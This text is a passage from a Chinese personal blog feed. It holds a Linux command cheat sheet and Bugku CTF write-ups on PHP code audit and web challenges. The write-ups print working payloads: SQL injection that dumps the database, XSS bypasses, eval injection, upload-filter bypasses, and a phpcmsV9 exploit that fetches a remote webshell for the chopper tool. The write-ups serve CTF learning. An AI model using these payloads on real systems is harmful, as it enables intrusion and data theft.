href="#安装日志" class="headerlink" title="安装日志"></a>安装日志</h1><p>/root/install.log 存储了安装在系统中的软件包及版本信息<br>/root/install.log.syslog 存储了安装过程中留下的时间记录<br>/root/anaconda-ks.cfg 以Kickstart配置文件的格式记录安装过程中的选项信息</p><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p><strong>命令 [选项] [参数]</strong></p><h2 id="终端几个符号的认识"><a href="#终端几个符号的认识" class="headerlink" title="终端几个符号的认识"></a>终端几个符号的认识</h2><ol><li>超级用户提示符  <code>#</code></li><li>普通用户提示符  <code>$</code></li></ol><h2 id="目录处理命令"><a href="#目录处理命令" class="headerlink" title="目录处理命令"></a>目录处理命令</h2><h3 id="pwd-显示当前目录"><a href="#pwd-显示当前目录" class="headerlink" title="pwd 显示当前目录"></a><code>pwd</code> 显示当前目录</h3><h3 id="ls-l-可以看见权限"><a href="#ls-l-可以看见权限" class="headerlink" title="ls -l 可以看见权限"></a><code>ls -l</code> 可以看见权限</h3><p>权限一共有十位<br>例如 <code>-rw-r--r--</code><br>-文件类型  （-文件 d目录 I软连接）<br><code>rw-</code>    u所有者<br><code>r--</code>    g所属组<br><code>r--</code>     o其他人<br>r读 w写 x执行</p><h3 id="建立目录"><a href="#建立目录" class="headerlink" title="建立目录"></a>建立目录</h3><p><code>mkdir -p [目录名]</code>     make dictionary<br><code>-p</code> 递归创建<br>如果没有-p只能创建单个目录，要创建一串目录加-p即可</p><h3 id="切换所在目录"><a href="#切换所在目录" class="headerlink" title="切换所在目录"></a>切换所在目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd [目录]</span><br></pre></td></tr></table></figure><p>简化操作<br><code>cd ~</code> 或者 直接一个cd进入当前用户的家目录<br><code>cd -</code> 进入上次目录<br><code>cd ..</code> 进入上级目录<br><code>cd .</code> 进入当前目录<br><code>注意</code>全部命令都有空格   </p><p><code>Ctrl+L</code>  清屏</p><h3 id="删除空目录"><a href="#删除空目录" class="headerlink" title="删除空目录"></a>删除空目录</h3><p><code>rmdir [目录名]</code>    remove empty dictionary<br>极其少用</p><h3 id="删除文件或者目录"><a href="#删除文件或者目录" class="headerlink" title="删除文件或者目录"></a>删除文件或者目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf</span><br></pre></td></tr></table></figure><p>选项 <code>-r</code> 删除目录<br><code>-f</code> 强制</p><h3 id="复制命令"><a href="#复制命令" class="headerlink" title="复制命令"></a>复制命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [选项] [原文件或目录] [目标目录]</span><br></pre></td></tr></table></figure><p><code>-r</code> 复制目录<br><code>-p</code> 连带文件属性复制<br><code>-a</code> 相当于-pdr</p><h3 id="剪切或者改名命令"><a href="#剪切或者改名命令" class="headerlink" title="剪切或者改名命令"></a>剪切或者改名命令</h3><p><code>mv</code> [原文件或目录] [目标目录]<br>后边两个参数一样就是改名功能</p><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p><code>touch</code> 文件名</p><h3 id="显示文件内容"><a href="#显示文件内容" class="headerlink" title="显示文件内容"></a>显示文件内容</h3><p><code>cat</code> 文件名</p><h3 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate 文件名</span><br></pre></td></tr></table></figure><p>在后台数据库中按文件名搜索，速度快<br>/var/lib/mlocate locate命令搜索的后台数据库<br><code>updatedb</code> 更新数据库，如果不强制更新的话得等一天你新建的东西才能搜索到</p><h3 id="搜索命令的命令"><a href="#搜索命令的命令" class="headerlink" title="搜索命令的命令"></a>搜索命令的命令</h3><p><code>whereis命令</code>  搜索命令所在路径及帮助文档所在位置<br>选项：  -b 只查找可执行文件 -m 只查找帮助文件</p><p>环境变量路径可以用echo $PATH查出</p><h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><p>举几个例子就懂<br><code>find /etc -name init</code>  在etc目录下查找文件名为init</p><p><code>find  /  -size +204800</code>  在根目录下下查找大于100MB的文件</p><p><code>find  / -user sam</code>    在根目录下查找所有者为Sam的文件<br>家有其他一些什么-ctime 属性就不一一记了，我觉得常用的就那几个</p><h3 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h3><p>1.压缩成gz文件的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip 文件名</span><br></pre></td></tr></table></figure><p>解压gz文件的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip 压缩文件名</span><br></pre></td></tr></table></figure><p>2.压缩成.tar.gz文件<br><code>tar -zcvf  目录</code>        将一个目录打包并压缩<br>解压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf   文件名</span><br></pre></td></tr></table></figure><p>还有其他的压缩命令zip与unzip,自行看看就好，哦对了突然想起来伪加密在Linux下面可以直接打开。。。。。。</p><h3 id="网络通信命令"><a href="#网络通信命令" class="headerlink" title="网络通信命令"></a>网络通信命令</h3><p><code>ping</code>命令，不多说，Windows跟linux都有</p><p>查看网络设置信息<br><code>ifconfig</code>   注意与Windows下面的ipconfig对比</p><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p><code>shutdown</code>  关机<br><code>reboot</code>  重启<br>不多说，这些跟Windows下面都是一样的</p><h1 id="Vim文本编辑器"><a href="#Vim文本编辑器" class="headerlink" title="Vim文本编辑器"></a>Vim文本编辑器</h1><p>听说这是一款强大的编辑器？。。。没有菜单只有命令<br><a href="https://imgchr.com/i/CgypMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgypMd.md.png" alt="CgypMd.md.png"></a></p><h2 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h2><ol><li><code>a</code> 在光标后面附加文本</li><li><code>i</code>  在光标前插入文本</li><li><code>o</code>  在光标下插入文本</li><li><p><code>O</code>  在光标上插入文本</p></li><li><p>还有就是上下左右键控制也行,<code>$</code>移至行尾,<code>0</code>移至行首</p></li></ol><ol start="6"><li><p><code>D</code> 删除光标处所在处到行尾</p></li><li><p><code>yy</code> 复制当前行,<code>dd</code> 剪切当前行,<code>p,P</code>  粘贴,<code>u</code>  取消上一步操作,<code>:wq</code>  保存并退出</p></li></ol><p><code>注意</code>Vim里面的命令都是要在ESC之后才可以使用。。。。。</p><h4 id="最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下-可能有些零碎，毕竟是边学边记录。。。。"><a href="#最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下-可能有些零碎，毕竟是边学边记录。。。。" class="headerlink" title="最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下,可能有些零碎，毕竟是边学边记录。。。。"></a>最近在家熟悉一下Linux命令。。。。。。还有Vim编辑器，我只是简单了解一下，把我认为要经常用的命令，都总结一下,可能有些零碎，毕竟是边学边记录。。。。</h4>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Linux常用命令 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku 代码审计 write up</title>
      <link href="/2018/02/17/bugku-php-check/"/>
      <url>/2018/02/17/bugku-php-check/</url>
      <content type="html"><![CDATA[<p>今天做了一波审计的题目，就记录一下吧<br><a id="more"></a></p><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>查一下php手册</p><p><a href="https://imgchr.com/i/Cgy8iT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgy8iT.md.png" alt="Cgy8iT.md.png"></a><br>本函数用来将变量从数组中导入到当前的符号表中。<br>返回成功导入到符号表中的变量数目。<br>而且这个函数没还有任何参数，很危险，直接可以修改冲突的变量<br><a href="https://imgchr.com/i/CgyJWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgyJWF.md.png" alt="CgyJWF.md.png"></a></p><p>关键的代码<br><img src="https://s1.ax1x.com/2018/05/20/CgyUy9.png" alt="CgyUy9.png"><br>构建的payload: <code>?shiyan=&amp;flag=</code><br>因为不知道flag里面什么内容，让它变成空，然后使$content变成空，然后$shiyan变量和$content变量的内容都会被设置成空. 满足条件便会出现flag</p><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p>这题关键的函数都没给出来。。。题目说用strcmp的特性。。。<br>那我就随便个数组进去一个?a[]…flag就出来了。。尴尬</p><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>这个题好像在实验吧做过。。。。。<br>利用了两次urldecode第一次是浏览器的解码第二次是函数的解码<br>所以我利用了里面的其中一个字母D编码第一次编码是%44，第二次编码是%2544<br>payload: <code>?id=hacker%2544J</code></p><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p>利用php的md5()函数有一个缺陷，这里是===，只能用数组处理，它无法处理数组返回null构造payload: <code>?username[]=1&amp;password[]=2</code></p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p>首先是ereg这个正则匹配函数是处理字符串的。。。构造数组是返回null，然后的话null===false 不相等可以执行下面的else if语句。。。<br>strpos处理数组页数返回null,于是null!==false成立就得到了flag<br>payload: <code>?password[]=1</code></p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><p>关键部分还是===，只能用数组处理，利用了sha1函数处理数组返回null的特性。<br>payload: <code>?name[]=1&amp;password[]=2</code></p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>这一题里面是==，直接找一个MD5之后还是0e开头的即可，比如s878926199a<br>payload: <code></code></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>ord() 函数返回字符串的‘首个’字符的 ASCII 值。<br>利用这一个与题目的16进制，用16进制开头的0x去绕过即可。。。<br>用Python写个脚本转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">3735929054</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%##x'</span>%num)</span><br></pre></td></tr></table></figure><p>得到<code>0xdeadc0de</code><br>payload: <code>?password=0xdeadc0de</code></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>因为ereg存在%00漏洞，所以在第一个条件里面先构建一个截断绕过，然后就开始执行下面的else if语句，长度要小于8，数目要大于9999999，这里就用科学计数法，用1e8去绕过<br>下面还有一个strpos函数还要判断里面是否含有’-‘符号，所以最后的payload应该是:?password=1e8%00–,出错了。。。<br><img src="https://s1.ax1x.com/2018/05/20/CgyaLR.png" alt="CgyaLR.png"><br>没办法只能找一下原题，发现人家的题目是要包含<code>*-*</code> ，但是他题目就一条横杠。。。坑了不少人。。。<br>改一下payload: <code>?password=1e8%00*-*</code> ,立刻出flag<br>查了查手册，还有个类似的函数叫eregi，只是不判断大小写罢了<br><a href="https://imgchr.com/i/CgyBo6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgyBo6.md.png" alt="CgyBo6.md.png"></a></p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p>这一题跟那题数组返回NULL绕过，感觉好像是一样的。。。。。<br>就是传入的参数不一样了。。。。。<br>payload： <code>?ctf[]=1</code></p><p>后来看了看下面的文章，发现还有一个方法2：字符串截断,利用ereg()的%00截断漏洞，绕过正则过滤 <code>?nctf=1%00##biubiubiu</code> 发现是一堆乱码，<br><img src="https://s1.ax1x.com/2018/05/20/CgyrFK.png" alt="CgyrFK.png">这里需要特别注意， 需将##编码 <code>?nctf=1%00%23biubiubiu</code> 才能出flag。。。。</p><h2 id="给一个适合新手的学习文章："><a href="#给一个适合新手的学习文章：" class="headerlink" title="给一个适合新手的学习文章："></a>给一个适合新手的学习文章：</h2><p><a href="http://www.freebuf.com/articles/rookie/152209.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/152209.html</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Web write up</title>
      <link href="/2018/02/14/bugku-Web-write-up/"/>
      <url>/2018/02/14/bugku-Web-write-up/</url>
      <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>view-source:查看源码即可<br><a id="more"></a></p><h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>上传一个PHP文件发现他要的是图片文件，抓包先改一下content-type为image/jpeg，Go一下发现flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg6E01.png" alt="Cg6E01.png"></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12调出开发者工具，把maxlength改为更长的长度即可</p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>完全就是考php基础，直接URL加上index.php?what=flag即可</p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>用Hackbar post数据即可</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>利用了==的弱类型，然后令num=1e，get上去即可绕过</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>停止之后，查看源码，最后发现了Html的编码，直接python跑一下即可</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>查看源码发现是宽字节的注入<br><img src="https://s1.ax1x.com/2018/05/20/Cg6mtK.png" alt="Cg6mtK.png"><br>从报错可以猜测语句是select * from ** where id=’input’<br>注意key的双引号<br>payload:<code>?id=-1%df&#39;union select string,2 from `key` where id=1 --+</code></p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>代码里面是数字型的注入<br>查看代码里面的strip_tags函数是返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果，可以利用这个特性去过滤<br><img src="https://s1.ax1x.com/2018/05/20/Cg6Q6H.png" alt="Cg6Q6H.png"><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om `key` where id=1--+</span><br></pre></td></tr></table></figure><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>抓包go几下即可。。。<br><img src="https://s1.ax1x.com/2018/05/20/Cg63nA.png" alt="Cg63nA.png"></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>读一下代码eval函数是执行代码的，而var_dump函数是把所有变量的属性给显示出来的，flag在flag.php里面那么我们就构造file函数传参给hello<br>payload：<code>http://120.24.86.145:8003/?hello=file(%27flag.php%27)</code><br>这题还有其他方法<br>比如:<br><code>http://120.24.86.145:8003/?hello=$GLOBALS</code>     利用了全局变量<br><code>http://120.24.86.145:8003/?hello=);show_source(%27flag.php%27);//</code>    利用了eval执行函数去闭合var_dump函数</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>这里有个正则表达式，没啥影响，发现出现了$$的变量，直接用全局变量$GLOBALS即可，payload:?args=GLOBALS,进而构造出var_dump($GLOBALS)<br><img src="https://s1.ax1x.com/2018/05/20/Cg680I.png" alt="Cg680I.png"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码发现有url编码，解码后观察代码，发现password为67d709b2b54aa2aa648cf6e87a7114f1,提交之后得到key</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>查看源码发现里面有JSfuck，解码一下，得到flag,记的提交的时候全大写。。。。</p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>进去之后点击，发现url上面有file参数，就想到了php里面的file协议，用base64转码把index.php里面的内容读出来，再解码，得到flag</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>5位数，用python写个字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=open(&apos;5位数.txt&apos;,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(10000,100000):</span><br><span class="line">print i</span><br><span class="line">f.write(str(i))</span><br><span class="line">f.write(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>直接用bp暴力破解,密码是13579<br><img src="https://s1.ax1x.com/2018/05/20/Cg6d1g.png" alt="Cg6d1g.png"></p><h2 id="点击一万次"><a href="#点击一万次" class="headerlink" title="点击一万次"></a>点击一万次</h2><p>右击审查元素,发现只要clicks参数大于1000000才会出现flag，在控制台里面输入clicks&gt;1000000的数字即可，记得最后还要点一下才出现flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg6s7q.png" alt="Cg6s7q.png"></p><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>查看网页源代码发现里面有一个code.txt打开一看原来是代码审计问题<br>利用了==弱类型以及strcmp()函数，它无法处理处理数组<br>这里有两个MD5后可以弱类型截断的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>关键payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><p>一个简单的SQL注入题没有过滤，输入单引号不回显，再加一个注释回显，便猜测SQL语句应该是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from **** where id=&apos;&apos;;</span><br></pre></td></tr></table></figure><p>用hackbar去post数据<br>先二分法看有几列 id=1’ order by 4##<br>验证四列到底怎么显示  <code>id=-1&#39; union select 1,2,3,4 ##</code>  这里id=-1，是为了让前面的语句为空，让后面的语句回显<br>爆库  <code>id=-1&#39; union select 1,2,3,database() ##</code>   就一个数据库<br>爆表   <code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;##</code> 两个表分别是    fl4g,sc<br>肯定是fl4g表，接下来爆字段 <code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; ##</code><br>爆内容 <code>id=-1&#39; union select 1,2,3,skctf_flag from `fl4g` ##</code></p><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>还是利用了sha1不能处理数组的特性。。。。。。<br>下面是payload<br><img src="https://s1.ax1x.com/2018/05/20/Cg6fc4.png" alt="Cg6fc4.png"></p><h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>目录下发现robots.txt，里面有一个目录<br><img src="https://s1.ax1x.com/2018/05/20/Cg6oH1.png" alt="Cg6oH1.png"><br>于是就到另外一个目录看一下，发现下面有行字，<br><img src="https://s1.ax1x.com/2018/05/20/Cg6b4K.png" alt="Cg6b4K.png"><br>又想到提示里面的管理员，猜测密码可能是admin或者是administrator，尝试第一个的时候就对了<br><img src="https://s1.ax1x.com/2018/05/20/Cg6L9O.png" alt="Cg6L9O.png"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>先来最简单的弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;srcipt&gt;altert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>查看源码<br><img src="https://s1.ax1x.com/2018/05/20/Cg6zDA.png" alt="Cg6zDA.png"><br>发现&lt;&gt;被过滤掉了<br>这里学到一个技巧，就是用Unicode编码绕过<br>payload:<code>?id=\u003cimg src=1 onerror=alert(_key_)\u003e</code></p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>这种题就是编程题<br>上脚本，注意这题是用margin。。。。查看源码可知<br><img src="https://s1.ax1x.com/2018/05/20/CgcSHI.png" alt="CgcSHI.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url =&apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line"></span><br><span class="line">r =requests.session()</span><br><span class="line"></span><br><span class="line">headers = r.get(url).headers</span><br><span class="line">##flag = head[&apos;Flag&apos;].split(&apos;:&apos;)[0]   注意response的键</span><br><span class="line">##print flag</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(base64.b64decode(headers[&apos;flag&apos;]).split(&apos;:&apos;)[1])</span><br><span class="line">data=&#123;&apos;margin&apos;:flag&#125;</span><br><span class="line">print r.post(url=url,data=data).content ##.text</span><br></pre></td></tr></table></figure><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>进去一看是条代码审计题目<br><img src="https://s1.ax1x.com/2018/05/20/Cgc9Et.png" alt="Cgc9Et.png"><br>这里加上别人跟自己对于正则的常规总结</p><pre><code>1.表达式直接写出来的字符串直接利用，如key2.“.”代表任意字符3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以&apos;^&apos;开头，以&apos;$&apos;结束4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束5.[a-z]代表a-z中的任意一个字符6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号7./i代表大小写不敏感8.{4-7}代表[0-9]中数字连续出现的次数是4-7次9.\s匹配任意的空白符10.\d    匹配数字11.\b    匹配单词的开始或结束</code></pre><p>自己的payload:<code>?id=keyakey1111key:/a/akeya@</code></p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>这个题目又学到了新知识<br>利用了file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入，只要构造php://input,且post数据过去即可<br>payload:?ac=1&amp;php://input然后再post一个 1即可</p><h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>这一道题目又学到新知识。。。。<br>用PHP别名来绕过。。。php2, php3, php4, php5, phps, pht, phtm, phtml<br>然后参考了大佬们的wp<br>发现这一题还要把Content-Type: multipart/form-data; 改成大小写绕过的形式，改为Content-Type: Multipart/form-data;<br>然后用别名去尝试php5的时候出现flag<br><img src="https://s1.ax1x.com/2018/05/20/CgcCUP.png" alt="CgcCUP.png"></p><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码，发现有一个1p.html<br>打开一看里面有js代码，直接放到控制台里面看一下<br>发现跳转到论坛，然后不知道要干嘛。。。。。<br>还是先转义一下那段东西吧，先urldecode，再发现里面有base64，然后再一次urldecode发现一段代码<br><img src="https://s1.ax1x.com/2018/05/20/Cgfi6O.png" alt="Cgfi6O.png"><br><img src="https://s1.ax1x.com/2018/05/20/CgfFXD.png" alt="CgfFXD.png"><br>发现有一个txt文件，不管那么多，先访问一下<br>得到flag</p><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>这个一句话是get方式发送数据<br>先了解一些函数<br>phpinfo()函数查看信息<br>看看根目录下有哪些文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&quot;./&quot;))</span><br><span class="line">print_r(glob(&quot;*&quot;))</span><br></pre></td></tr></table></figure><p>发现有一个flag.txt，直接访问即可，也可以用下面的函数打印出来<br>一些常用的输出文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(file(&apos;flag.txt&apos;)),这里的print_r换成var_dump也行</span><br><span class="line">show_source(&quot;flag.txt&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgfE0H.png" alt="CgfE0H.png"></p><h2 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h2><h2 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h2><p>这是我第一次尝试这样的漏洞。。。。。<br>先百度一下，发现phpcmsV9存在前台注册页面存在getshell漏洞，<br><img src="https://s1.ax1x.com/2018/05/20/Cgf6E9.png" alt="Cgf6E9.png"><br>先用bp抓包，<br><img src="https://s1.ax1x.com/2018/05/20/Cgf0jU.png" alt="Cgf0jU.png"><br>在最下面的post数据里面加上<code>&amp;info[content]=&lt;img src=http://www.bugku.com/tools/phpyijuhua.txt?.php##.jpg&gt;</code></p><p>这里面的链接是Bugku论坛里面的现成的小马，当然你也可以自己写一个。。。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CgfwcT.png" alt="CgfwcT.png"><br>然后复制go之后返回数据包里面的链接，也就是右边的箭头，用菜刀链接。。。说起这个菜刀这工具，这是我第一次真正用它实操，以前我都是看视频看别人用的。。。￣□￣｜｜<br><img src="https://s1.ax1x.com/2018/05/20/Cgfd3V.png" alt="Cgfd3V.png"></p><p>连接之后在根目录下找到flag的图片，放进HXD里面就能找到flag了。。。。</p><p>啊，还有一种方法是直接用bugku论坛里面的getshell工具，自动出来shell地址，然后菜刀链接那个地址即可<br><img src="https://s1.ax1x.com/2018/05/20/Cgfa90.png" alt="Cgfa90.png"></p><p>说起来我还是喜欢上面的方法，复现一下也蛮好的。。。。。。。。</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>因为题目提示hint，于是就输入?hint<br><img src="https://s1.ax1x.com/2018/05/20/CgfYAs.png" alt="CgfYAs.png"><br>原来是代码审计题目<br>考了一个反序列化的知识点<br>构造payload,但是注意代码中if-else的范围，倒数第二行中确实为变量KEY赋值了，但是它是在另一个else里<br>在进行严格比较前，变量KEY的值并没有被赋值<br>所以KEY为空值<br>然后在bp上构建payload<br><img src="https://s1.ax1x.com/2018/05/20/CgfG7j.png" alt="CgfG7j.png"></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开一看一串东西，题目不是说是备份是个好东西吗。。备份的话就会想到源码泄露之类的东西，这里介绍一个好用的东西<br><a href="coding.net/u/yihangwang/p/SourceLeakHacker/git">SourceLeakHacker</a><br>上去一扫，发现文件<br><img src="https://s1.ax1x.com/2018/05/20/CgfljS.png" alt="CgfljS.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cgf8BQ.png" alt="Cgf8BQ.png"><br>两种payload:<br>第一种是利用MD5函数返回false的，第二种是弱类型，MD5之后是0e开头的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?kkeyey1[]=1&amp;kkeyey2[]=2</span><br><span class="line">?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" 